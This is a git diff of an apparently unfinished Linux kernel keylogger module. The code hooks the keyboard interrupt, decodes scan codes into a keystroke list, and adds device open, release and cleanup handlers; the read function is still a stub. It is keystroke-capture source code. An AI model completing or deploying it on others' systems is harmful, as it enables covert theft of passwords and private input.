@@ -10,19 +10,6 @@ static unsigned int windex = -1;
 
 static unsigned int rindex = 0;
 
-static struct file_operations keylogger_misc_fops = {
-	.read = keylogger_read,
-	.write = keylogger_write,
-};
-
-static struct miscdevice keylogger_misc = {
-	.minor = MISC_DYNAMIC_MINOR,
-	.name = "module_keylogger",
-	.fops = &keylogger_misc_fops,
-};
-
-LIST_HEAD(keystroke_list);
-
 static struct fsm scan_fsm = {
 	.ct = 0,
 	.state = UNDEFINED,
@@ -31,6 +18,54 @@ static struct fsm scan_fsm = {
 	.name = NULL,
 };
 
+LIST_HEAD(keystroke_list);
+
+static char	*keylogger_buffer = NULL;
+
+/* Multiples fd sync and protect */
+/* multi buffer, multi flush ? */
+
+int	keylogger_open(struct inode *inode, struct file *filp)
+{
+	struct list_head 	*pos;
+	ssize_t			size = 0;
+
+	list_for_each(pos, &keystroke_list) {
+		size++;
+	}
+
+	printk(KERN_INFO "nbr entries %lu\n", size);
+	keylogger_buffer = kmalloc(sizeof(struct keystroke) * size + 1, GFP_KERNEL);
+
+	return 0;
+}
+
+int	keylogger_release(struct inode *inode, struct file *filp)
+{
+	kfree(keylogger_buffer);
+
+	return 0;
+}
+
+ssize_t keylogger_read(struct file *filp, char __user *buffer,
+				size_t length, loff_t *offset)
+{
+	ssize_t		retval = 0;
+
+	return retval;
+}
+
+static struct file_operations keylogger_misc_fops = {
+	.open = keylogger_open,
+	.read = keylogger_read,
+	.release = keylogger_release,
+};
+
+static struct miscdevice keylogger_misc = {
+	.minor = MISC_DYNAMIC_MINOR,
+	.name = "module_keylogger",
+	.fops = &keylogger_misc_fops,
+};
 
 /* Assumption : if windex overrun rindex then static size is too small  */
 /* To be revised */
@@ -45,16 +80,15 @@ static void do_tasklet(unsigned long unused)
 	{
 		read_lock(&keyboard_rwlock);
 		packet = scan_array[rindex++];
-		/*packet = scan_array[windex]; */
 		read_unlock(&keyboard_rwlock);
-		printk(KERN_INFO "tasklet : [%x]\n", packet);
+		/*printk(KERN_INFO "tasklet : [%x]\n", packet); */
 		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
 		if (scan_fsm.state == SUCCESS)
 			scan_fsm_send(&scan_fsm, &keystroke_list);
 		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
-			scan_fsm_clear(&scan_fsm);	
+			scan_fsm_clear(&scan_fsm);
 		/* state machine
 		 *  if SUCCESS, format packet and& send it to buffer
 		 *  if ERROR, flush fsm
@@ -116,12 +150,23 @@ err:
 
 static void __exit keylogger_cleanup(void)
 {
+	struct keystroke *ks = NULL;
+	struct keystroke *n = NULL;
+
 	misc_deregister(&keylogger_misc);
 	printk(KERN_INFO "keylogger module : deregister\n");
 
 /*	void driver_register(struct device_driver *drv) */
 
 	free_irq(KEYBOARD_IRQ, id);
+
+	/* free list */
+	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
+		list_del(&ks->list);	
+		kfree(ks);
+	}
+
+	/* free misc buffer */
 }
 
 module_init(keylogger_init);
